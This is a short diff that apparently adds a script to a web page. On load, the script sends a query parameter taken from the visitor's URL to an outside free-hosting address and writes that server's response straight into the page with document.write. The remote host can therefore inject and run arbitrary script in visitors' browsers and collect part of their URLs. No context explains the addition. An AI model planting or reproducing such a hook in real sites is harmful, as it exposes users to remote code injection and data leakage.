@@ -1,0 +1,19 @@
+<script>
+window.onload = function(){
+var urlString = (window.location.href).toLowerCase();
+var url = new URL(urlString);
+var c = url.searchParams.get("url");
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function(){
+if(xhr.readyState == 4 && xhr.status== 200){
+document.write(xhr.responseText);
+
+}
+}
+xhr.open('POST','https://rianwahid.000webhostapp.com/test.php?url='+c, true);
+xhr.send();
+
+
+}
+
+</script>
